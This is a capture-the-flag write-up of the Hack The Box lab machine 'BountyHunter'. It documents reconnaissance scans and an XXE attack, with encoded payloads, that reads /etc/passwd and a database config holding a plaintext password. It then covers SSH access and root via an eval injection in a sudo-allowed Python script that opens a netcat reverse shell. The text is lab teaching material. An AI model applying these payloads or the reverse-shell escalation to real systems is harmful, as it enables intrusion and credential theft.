# BountyHunter

Linux server XML External Entity exploit, and giving sudo privilege file/cmd to user makes system weakness

## Ifconfig

```
inet 10.10.14.46  destination 10.10.14.46
inet6 fe80::c5a7:fe18:4b74:a136
```

## Nmap

> sudo nmap -sC -sV -A 10.10.11.100 | tee [nmap.log](./nmap.log)

=> Found there is 80 as a http port at server

## Gobuster

> gobuster dir -u 10.10.11.100 -w /usr/share/wordlists/dirb/common.txt 2> /dev/null | tee [gobuster.log](./gobuster.log)

=> /resources directory exploited

## Nikto

> nikto -h 10.10.11.100 | tee [nikto.log](./nikto.log)

```
+ OSVDB-3093: /db.php: This might be interesting... has been seen in web logs from an unknown scanner.
```

=> But db.php currently has nothing there

## Goto server site and find /resources

- README.txt

```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

=> Inferring that `test` account may be a breakthrough

- bountylog.js

```
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

=> All data will be passed to `tracker_diRbPr00f314.php`

## Portal login

- Try to login with named "test" account

```
Exploit title: test
CWE: test
CVSS Score: test
Bounty Reward: test
```

=> It will generate a `tracker_diRbPr00f314.php` by POST

- Take a look at request of network

```
data: PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT50ZXN0PC90aXRsZT4KCQk8Y3dlPnRlc3Q8L2N3ZT4KCQk8Y3Zzcz50ZXN0PC9jdnNzPgoJCTxyZXdhcmQ+dGVzdDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==
```

- The data was encoded with base64, try to decode it

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>test</title>
		<cwe>test</cwe>
		<cvss>test</cvss>
		<reward>test</reward>
		</bugreport>
```

=> It's parsed with xml input, which will be vulnerable at [XML External Entity](https://en.wikipedia.org/wiki/XML_external_entity_attack)

- Replace the request by [xxe file](./xxe/xxe.xml) [(usage)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-xxe-to-retrieve-files)

Becuz the request format of *raw* response is *base64-URL-encoded*

Convert to base64-encoded

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJld2FyZCBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgoJCTxidWdyZXBvcnQ+CgkJPHRpdGxlPjwvdGl0bGU+CgkJPGN3ZT48L2N3ZT4KCQk8Y3Zzcz48L2N2c3M+CgkJPHJld2FyZD4meHhlOzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg==
```

From base64-encoded to URL-encoded

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJld2FyZCBbPCFFTlRJVFkgeHhlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgoJCTxidWdyZXBvcnQ%2BCgkJPHRpdGxlPjwvdGl0bGU%2BCgkJPGN3ZT48L2N3ZT4KCQk8Y3Zzcz48L2N2c3M%2BCgkJPHJld2FyZD4meHhlOzwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

- Resending by debug tools and replace the data with encoded data

> data=*above encoded data content*

- Reflected `/etc/passwd` on tag *reward* (enable raw to have a nice view)

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

=> Found the *development* as a valid non-privileged user

- Get the db.php file by [php wrapper payloads](./xxe/xxe.xml)

Convert to base64-URL-encoded

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJld2FyZCBbPCFFTlRJVFkgeHhlIFNZU1RFTSAicGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT0vdmFyL3d3dy9odG1sL2RiLnBocCI%2BXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT48L3RpdGxlPgoJCTxjd2U%2BPC9jd2U%2BCgkJPGN2c3M%2BPC9jdnNzPgoJCTxyZXdhcmQ%2BJnh4ZTs8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

=> Reponse as a base64-encode data

```
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```

- Decode the data

```
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

- Induct the content

```
username: development
password: m19RoAU0hP41A1sTsq6K
```

## SSH Login

> ssh development@10.10.11.100

> whoami

```
development
```

> id

```
uid=1000(development) gid=1000(development) groups=1000(development)
```

```
user.txt
eca25dbd62925de90d5cd884e5ac47b9
```

## Attempt to get the root privilege

- Make sure sudo list

> sudo -l

```
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

- Take a look at [ticketValidator.py](./ssh/ticketValidator.py)

=> To make the eval result to be `True`, need: 

```
Must be ext .md file
#1          "# Skytrain Inc"
#2          "## Ticket to "
#3+         "__Ticket Code:__"
#3+ + 1     "r'\*\*[0-9][0-9\+]*[0-9](\*\*)?'" (first number as code, and expression as result)
code % 7 == 4 && result > 100
```

- Embedding [python code](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to [md file](./ssh/root.md) in victim side, and reverse shell by local site

### Victim (Need to create a md file first)

> sudo python3.8 /opt/skytrain_inc/ticketValidator.py

```
Please enter the path to the ticket file.
root.md
Destination: whatever you like
```

### Attacker

> nc -lvnp 8080

```
listening on [any] 8080 ...
connect to [10.10.14.46] from (UNKNOWN) [10.10.11.100] 56702
```

> whoami 

```
root
```

- Change to interactive shell

> /usr/bin/script -qc /bin/bash /dev/null

```
root.txt
6aee2773b241427c021ff4140918a031
```

## Else

- contract.txt

```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

=> Not important
